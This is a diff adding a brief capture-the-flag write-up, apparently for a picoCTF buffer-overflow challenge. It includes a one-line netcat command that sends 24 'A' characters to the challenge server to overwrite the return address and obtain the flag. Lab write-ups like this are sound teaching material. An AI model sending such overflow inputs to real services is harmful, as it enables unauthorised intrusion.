@@ -1,0 +1,11 @@
+1.Download files.
+2.let's go see the code/ .py file.
+
+3.Let's go to terminal .
+
+By sending 24 * 'A', the return address is overwritten with 0x41414141 (hex for AAAA), which is an invalid memory address.
+
+┌──(kali㉿kali)-[~]
+└─$ python -c "print('A' * 24)" | nc saturn.picoctf.net 50809
+
+4.It will show the flag. Problem solved.
